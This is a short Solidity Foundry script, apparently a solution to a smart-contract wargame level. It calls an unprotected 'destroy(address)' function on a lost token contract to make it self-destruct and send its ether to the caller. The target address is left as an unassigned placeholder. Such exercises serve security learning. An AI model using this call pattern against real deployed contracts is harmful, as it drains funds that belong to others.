pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Recover is Script
{
    function run() external
    {
        vm.startBroadcast();

        address lostToken; // address of the contract from the "contract creation" transaction
                           // from your instance address, can be viewed on etherscan
        bytes4 selector = bytes4(keccak256("destroy(address)"));
        bytes memory data = abi.encodeWithSelector(selector, msg.sender);

        (bool success, ) = lostToken.call(data);
        require(success, "Call failed");

        vm.stopBroadcast();
    }
}
